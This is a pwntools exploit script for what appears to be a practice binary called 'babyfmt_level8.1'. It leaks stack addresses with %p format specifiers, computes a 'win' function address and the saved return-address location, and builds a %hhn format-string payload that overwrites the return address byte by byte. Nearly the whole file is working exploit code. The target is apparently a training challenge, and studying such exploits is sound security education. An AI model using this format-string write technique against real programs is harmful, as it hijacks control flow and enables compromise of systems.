from pwn import * 

binary = './babyfmt_level8.1'
p = process(binary)

s = '''
b * printf
'''



# Initial leaks - you're already doing this well
payload = flat(
    "%151$p\n"
    "%150$p"
)

p.sendline(payload)
p.recvuntil("Your input is:")






p.recvline()

# Parse leaks
leak = p.recvline().strip().decode()
leak = int(leak, 16)
win = leak - 0x380

leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip = leak - 0x48

print(f"RIP address: {hex(rip)}")
print(f"Win address: {hex(win)}")








'''

payload = flat(
	"%2c%150$hhn--"

)

gdb.attach(p, s)


p.sendline(payload)


p.interactive()
'''





win_bytes = [0] * 8
for i in range(8):
	win_bytes[i] = (win >> (i * 8)) & 0xff
	print(hex(win_bytes[i]))

payload = b"-----------" 

param_pos = 47

printed = len(payload) + 0x85        

print(printed)
for i, byte in enumerate(win_bytes):

    if byte < printed % 256:
        padding = 256 + byte - (printed % 256)
    else:
        padding = byte - (printed % 256)
    
    if padding != 0: 
        payload += f"%{padding}c".encode()
        printed += padding
    
    
    
    payload += f"%{param_pos + i}$hhn".encode()



rip_addrs = [rip + i for i in range(8)]

for addr in rip_addrs:
	payload += p64(addr)



gdb.attach(p, s)

p.sendline(payload)




p.interactive()
